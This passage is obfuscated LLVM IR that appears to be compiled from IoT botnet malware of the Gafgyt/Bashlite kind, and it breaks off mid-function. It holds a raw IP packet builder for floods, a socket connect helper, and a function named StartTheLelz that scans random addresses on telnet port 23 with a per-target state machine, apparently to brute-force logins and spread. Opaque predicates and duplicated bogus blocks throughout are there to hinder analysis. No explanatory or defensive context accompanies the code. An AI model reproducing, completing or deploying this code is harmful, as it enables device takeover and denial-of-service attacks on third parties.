define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* %2, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind uwtable
define i8* @mygethostbyname(i8*) #0 {
  %2 = load i32, i32* @x.81
  %3 = load i32, i32* @y.82
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca %struct.addrinfo, align 8
  %14 = alloca %struct.addrinfo*, align 8
  %15 = alloca %struct.addrinfo*, align 8
  %16 = alloca %struct.sockaddr_in*, align 8
  %17 = alloca i32, align 4
  store i8* %0, i8** %11, align 8
  %18 = bitcast %struct.addrinfo* %13 to i8*
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 48, i32 8, i1 false)
  %19 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %13, i32 0, i32 1
  store i32 2, i32* %19, align 4
  %20 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %13, i32 0, i32 2
  store i32 1, i32* %20, align 8
  %21 = load i8*, i8** %11, align 8
  %22 = call i32 @getaddrinfo(i8* %21, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.312, i32 0, i32 0), %struct.addrinfo* %13, %struct.addrinfo** %14)
  store i32 %22, i32* %17, align 4
  %23 = icmp ne i32 %22, 0
  %24 = load i32, i32* @x.81
  %25 = load i32, i32* @y.82
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %23, label %32, label %33

; <label>:32:                                     ; preds = %originalBBpart2
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.313, i32 0, i32 0), i8** %10, align 8
  br label %86

; <label>:33:                                     ; preds = %originalBBpart2
  %34 = load %struct.addrinfo*, %struct.addrinfo** %14, align 8
  store %struct.addrinfo* %34, %struct.addrinfo** %15, align 8
  br label %35

; <label>:35:                                     ; preds = %originalBBpart24, %33
  %36 = load %struct.addrinfo*, %struct.addrinfo** %15, align 8
  %37 = icmp ne %struct.addrinfo* %36, null
  br i1 %37, label %38, label %68

; <label>:38:                                     ; preds = %35
  %39 = load %struct.addrinfo*, %struct.addrinfo** %15, align 8
  %40 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %39, i32 0, i32 5
  %41 = load %struct.sockaddr*, %struct.sockaddr** %40, align 8
  %42 = bitcast %struct.sockaddr* %41 to %struct.sockaddr_in*
  store %struct.sockaddr_in* %42, %struct.sockaddr_in** %16, align 8
  %43 = load %struct.sockaddr_in*, %struct.sockaddr_in** %16, align 8
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %43, i32 0, i32 2
  %45 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %44, i32 0, i32 0
  %46 = load i32, i32* %45, align 4
  %47 = call i8* @inet_ntoa(i32 %46) #2
  store i8* %47, i8** %10, align 8
  br label %86
                                                  ; No predecessors!
  %49 = load i32, i32* @x.81
  %50 = load i32, i32* @y.82
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %48
  %57 = load %struct.addrinfo*, %struct.addrinfo** %15, align 8
  %58 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %57, i32 0, i32 7
  %59 = load %struct.addrinfo*, %struct.addrinfo** %58, align 8
  store %struct.addrinfo* %59, %struct.addrinfo** %15, align 8
  %60 = load i32, i32* @x.81
  %61 = load i32, i32* @y.82
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %35

; <label>:68:                                     ; preds = %35
  %69 = load i32, i32* @x.81
  %70 = load i32, i32* @y.82
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %68
  %77 = load %struct.addrinfo*, %struct.addrinfo** %14, align 8
  call void @freeaddrinfo(%struct.addrinfo* %77) #2
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.313, i32 0, i32 0), i8** %10, align 8
  %78 = load i32, i32* @x.81
  %79 = load i32, i32* @y.82
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %86

; <label>:86:                                     ; preds = %originalBBpart28, %38, %32
  %87 = load i8*, i8** %10, align 8
  ret i8* %87

originalBBalteredBB:                              ; preds = %originalBB, %1
  %88 = alloca i8*, align 8
  %89 = alloca i8*, align 8
  %90 = alloca i32, align 4
  %91 = alloca %struct.addrinfo, align 8
  %92 = alloca %struct.addrinfo*, align 8
  %93 = alloca %struct.addrinfo*, align 8
  %94 = alloca %struct.sockaddr_in*, align 8
  %95 = alloca i32, align 4
  store i8* %0, i8** %89, align 8
  %96 = bitcast %struct.addrinfo* %91 to i8*
  call void @llvm.memset.p0i8.i64(i8* %96, i8 0, i64 48, i32 8, i1 false)
  %97 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %91, i32 0, i32 1
  store i32 2, i32* %97, align 4
  %98 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %91, i32 0, i32 2
  store i32 1, i32* %98, align 8
  %99 = load i8*, i8** %89, align 8
  %100 = call i32 @getaddrinfo(i8* %99, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.312, i32 0, i32 0), %struct.addrinfo* %91, %struct.addrinfo** %92)
  store i32 %100, i32* %95, align 4
  %101 = icmp ne i32 %100, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %48
  %102 = load %struct.addrinfo*, %struct.addrinfo** %15, align 8
  %103 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %102, i32 0, i32 7
  %104 = load %struct.addrinfo*, %struct.addrinfo** %103, align 8
  store %struct.addrinfo* %104, %struct.addrinfo** %15, align 8
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %68
  %105 = load %struct.addrinfo*, %struct.addrinfo** %14, align 8
  call void @freeaddrinfo(%struct.addrinfo* %105) #2
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.313, i32 0, i32 0), i8** %10, align 8
  br label %originalBB6
}

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #3

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %11 = load i8*, i8** %4, align 8
  %12 = call i8* @mygethostbyname(i8* %11)
  %13 = bitcast i8* %12 to %struct.hostent*
  store %struct.hostent* %13, %struct.hostent** %6, align 8
  %14 = icmp eq %struct.hostent* %13, null
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %98

; <label>:16:                                     ; preds = %2
  %17 = load i32, i32* @x.83
  %18 = load i32, i32* @y.84
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %16
  %25 = load %struct.hostent*, %struct.hostent** %6, align 8
  %26 = getelementptr inbounds %struct.hostent, %struct.hostent* %25, i32 0, i32 4
  %27 = load i8**, i8*** %26, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 0
  %29 = load i8*, i8** %28, align 8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %31 = bitcast %struct.in_addr* %30 to i8*
  %32 = load %struct.hostent*, %struct.hostent** %6, align 8
  %33 = getelementptr inbounds %struct.hostent, %struct.hostent* %32, i32 0, i32 3
  %34 = load i32, i32* %33, align 4
  %35 = sext i32 %34 to i64
  call void @bcopy(i8* %29, i8* %31, i64 %35) #2
  %36 = load i16, i16* %5, align 2
  %37 = call zeroext i16 @htons(i16 zeroext %36) #13
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %39, align 4
  %40 = call i32 @socket(i32 2, i32 1, i32 6) #2
  store i32 %40, i32* %9, align 4
  %41 = load i32, i32* %9, align 4
  %42 = bitcast i32* %8 to i8*
  %43 = call i32 @setsockopt(i32 %41, i32 6, i32 1, i8* %42, i32 4) #2
  %44 = load i32, i32* %9, align 4
  %45 = icmp eq i32 %44, -1
  %46 = load i32, i32* @x.83
  %47 = load i32, i32* @y.84
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %45, label %54, label %55

; <label>:54:                                     ; preds = %originalBBpart2
  store i32 0, i32* %3, align 4
  br label %98

; <label>:55:                                     ; preds = %originalBBpart2
  %56 = load i32, i32* %9, align 4
  %57 = bitcast %union.__CONST_SOCKADDR_ARG* %10 to %struct.sockaddr**
  %58 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  store %struct.sockaddr* %58, %struct.sockaddr** %57, align 8
  %59 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %10, i32 0, i32 0
  %60 = load %struct.sockaddr*, %struct.sockaddr** %59, align 8
  %61 = call i32 @connect(i32 %56, %struct.sockaddr* %60, i32 16)
  %62 = icmp eq i32 %61, -1
  br i1 %62, label %63, label %80

; <label>:63:                                     ; preds = %55
  %64 = load i32, i32* @x.83
  %65 = load i32, i32* @y.84
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %63
  store i32 0, i32* %3, align 4
  %72 = load i32, i32* @x.83
  %73 = load i32, i32* @y.84
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %98

; <label>:80:                                     ; preds = %55
  %81 = load i32, i32* @x.83
  %82 = load i32, i32* @y.84
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %80
  %89 = load i32, i32* %9, align 4
  store i32 %89, i32* %3, align 4
  %90 = load i32, i32* @x.83
  %91 = load i32, i32* @y.84
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %98

; <label>:98:                                     ; preds = %originalBBpart28, %originalBBpart24, %54, %15
  %99 = load i32, i32* %3, align 4
  ret i32 %99

originalBBalteredBB:                              ; preds = %originalBB, %16
  %100 = load %struct.hostent*, %struct.hostent** %6, align 8
  %101 = getelementptr inbounds %struct.hostent, %struct.hostent* %100, i32 0, i32 4
  %102 = load i8**, i8*** %101, align 8
  %103 = getelementptr inbounds i8*, i8** %102, i64 0
  %104 = load i8*, i8** %103, align 8
  %105 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %106 = bitcast %struct.in_addr* %105 to i8*
  %107 = load %struct.hostent*, %struct.hostent** %6, align 8
  %108 = getelementptr inbounds %struct.hostent, %struct.hostent* %107, i32 0, i32 3
  %109 = load i32, i32* %108, align 4
  %110 = sext i32 %109 to i64
  call void @bcopy(i8* %104, i8* %106, i64 %110) #2
  %111 = load i16, i16* %5, align 2
  %112 = call zeroext i16 @htons(i16 zeroext %111) #13
  %113 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %112, i16* %113, align 2
  %114 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %114, align 4
  %115 = call i32 @socket(i32 2, i32 1, i32 6) #2
  store i32 %115, i32* %9, align 4
  %116 = load i32, i32* %9, align 4
  %117 = bitcast i32* %8 to i8*
  %118 = call i32 @setsockopt(i32 %116, i32 6, i32 1, i8* %117, i32 4) #2
  %119 = load i32, i32* %9, align 4
  %120 = icmp eq i32 %119, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %63
  store i32 0, i32* %3, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %80
  %121 = load i32, i32* %9, align 4
  store i32 %121, i32* %3, align 4
  br label %originalBB6
}

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #4

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @StartTheLelz(i32, i32) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [128 x i8], align 16
  %10 = alloca i8, align 1
  %11 = alloca i32, align 4
  %12 = alloca %struct.__sigset_t, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %24 = call i32 @fork() #2
  %25 = icmp slt i32 %24, 0
  br i1 %25, label %26, label %43

; <label>:26:                                     ; preds = %2
  %27 = load i32, i32* @x.85
  %28 = load i32, i32* @y.86
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %26
  %35 = load i32, i32* @x.85
  %36 = load i32, i32* @y.86
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

; <label>:43:                                     ; preds = %2
  %44 = load i32, i32* %4, align 4
  store i32 %44, i32* %11, align 4
  %45 = call i64 @time(i64* null) #2
  %46 = call i32 @rand_cmwc()
  %47 = zext i32 %46 to i64
  %48 = xor i64 %45, %47
  %49 = trunc i64 %48 to i32
  call void @srand(i32 %49) #2
  %50 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %50, align 4
  %51 = call zeroext i16 @htons(i16 zeroext 23) #13
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %51, i16* %52, align 2
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %54 = getelementptr inbounds [8 x i8], [8 x i8]* %53, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %54, i8 0, i64 8, i32 4, i1 false)
  %55 = call noalias i8* @malloc(i64 1025) #2
  store i8* %55, i8** %17, align 8
  %56 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* %56, i8 0, i64 1025, i32 1, i1 false)
  %57 = load i32, i32* %11, align 4
  %58 = zext i32 %57 to i64
  %59 = call i8* @llvm.stacksave()
  store i8* %59, i8** %19, align 8
  %60 = alloca %struct.telstate_t, i64 %58, align 16
  %61 = bitcast %struct.telstate_t* %60 to i8*
  %62 = load i32, i32* %11, align 4
  %63 = sext i32 %62 to i64
  %64 = mul i64 %63, 5
  call void @llvm.memset.p0i8.i64(i8* %61, i8 0, i64 %64, i32 16, i1 false)
  store i32 0, i32* %5, align 4
  br label %65

; <label>:65:                                     ; preds = %83, %43
  %66 = load i32, i32* %5, align 4
  %67 = load i32, i32* %11, align 4
  %68 = icmp slt i32 %66, %67
  br i1 %68, label %69, label %86

; <label>:69:                                     ; preds = %65
  %70 = load i32, i32* %5, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %71
  %73 = bitcast %struct.telstate_t* %72 to i8*
  call void @llvm.memset.p0i8.i64(i8* %73, i8 0, i64 32, i32 16, i1 false)
  %74 = load i32, i32* %5, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %75
  %77 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %76, i32 0, i32 3
  store i8 1, i8* %77, align 1
  %78 = load i8*, i8** %17, align 8
  %79 = load i32, i32* %5, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %80
  %82 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %81, i32 0, i32 9
  store i8* %78, i8** %82, align 8
  br label %83

; <label>:83:                                     ; preds = %69
  %84 = load i32, i32* %5, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %5, align 4
  br label %65

; <label>:86:                                     ; preds = %65
  br label %87

; <label>:87:                                     ; preds = %1452, %86
  br label %88

; <label>:88:                                     ; preds = %87
  store i32 0, i32* %5, align 4
  br label %89

; <label>:89:                                     ; preds = %1449, %88
  %90 = load i32, i32* @x.85
  %91 = load i32, i32* @y.86
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %89
  %98 = load i32, i32* %5, align 4
  %99 = load i32, i32* %11, align 4
  %100 = icmp slt i32 %98, %99
  %101 = load i32, i32* @x.85
  %102 = load i32, i32* @y.86
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %100, label %109, label %1452

; <label>:109:                                    ; preds = %originalBBpart24
  %110 = load i32, i32* @x.85
  %111 = load i32, i32* @y.86
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %109
  %118 = load i32, i32* %5, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %119
  %121 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %120, i32 0, i32 7
  %122 = load i32, i32* %121, align 16
  %123 = icmp eq i32 %122, 0
  %124 = load i32, i32* @x.85
  %125 = load i32, i32* @y.86
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %123, label %132, label %139

; <label>:132:                                    ; preds = %originalBBpart28
  %133 = call i64 @time(i64* null) #2
  %134 = trunc i64 %133 to i32
  %135 = load i32, i32* %5, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %136
  %138 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %137, i32 0, i32 7
  store i32 %134, i32* %138, align 16
  br label %139

; <label>:139:                                    ; preds = %132, %originalBBpart28
  %140 = load i32, i32* %5, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %141
  %143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %142, i32 0, i32 2
  %144 = load i8, i8* %143, align 8
  %145 = zext i8 %144 to i32
  switch i32 %145, label %1432 [
    i32 0, label %146
    i32 1, label %349
    i32 2, label %560
    i32 3, label %638
    i32 4, label %763
    i32 5, label %825
    i32 6, label %902
    i32 7, label %1082
  ]

; <label>:146:                                    ; preds = %139
  %147 = load i32, i32* %5, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %148
  %150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %149, i32 0, i32 3
  %151 = load i8, i8* %150, align 1
  %152 = zext i8 %151 to i32
  %153 = icmp eq i32 %152, 1
  br i1 %153, label %154, label %174

; <label>:154:                                    ; preds = %146
  %155 = load i32, i32* %5, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %156
  %158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %157, i32 0, i32 9
  %159 = load i8*, i8** %158, align 8
  store i8* %159, i8** %20, align 8
  %160 = load i32, i32* %5, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %161
  %163 = bitcast %struct.telstate_t* %162 to i8*
  call void @llvm.memset.p0i8.i64(i8* %163, i8 0, i64 32, i32 16, i1 false)
  %164 = load i8*, i8** %20, align 8
  %165 = load i32, i32* %5, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %166
  %168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %167, i32 0, i32 9
  store i8* %164, i8** %168, align 8
  %169 = call i32 @getDatIP()
  %170 = load i32, i32* %5, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %171
  %173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %172, i32 0, i32 1
  store i32 %169, i32* %173, align 4
  br label %254

; <label>:174:                                    ; preds = %146
  %175 = load i32, i32* %5, align 4
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %176
  %178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %177, i32 0, i32 3
  %179 = load i8, i8* %178, align 1
  %180 = zext i8 %179 to i32
  %181 = icmp eq i32 %180, 0
  br i1 %181, label %182, label %253

; <label>:182:                                    ; preds = %174
  %183 = load i32, i32* %5, align 4
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %184
  %186 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %185, i32 0, i32 5
  %187 = load i8, i8* %186, align 1
  %188 = add i8 %187, 1
  store i8 %188, i8* %186, align 1
  %189 = load i32, i32* %5, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %190
  %192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %191, i32 0, i32 4
  %193 = load i8, i8* %192, align 2
  %194 = add i8 %193, 1
  store i8 %194, i8* %192, align 2
  %195 = load i32, i32* %5, align 4
  %196 = sext i32 %195 to i64
